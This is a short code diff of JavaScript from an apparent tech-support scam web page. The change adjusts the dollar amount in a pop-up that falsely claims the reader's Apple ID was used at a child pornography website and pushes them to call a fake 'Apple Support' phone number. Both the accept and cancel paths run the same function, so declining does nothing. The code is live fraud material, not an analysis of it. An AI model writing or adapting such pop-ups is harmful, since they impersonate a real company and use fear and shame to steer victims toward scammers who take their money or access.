@@ -354,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPHY WEBSITE for $572.62 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-4965 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPHY WEBSITE for $149.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-4965 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
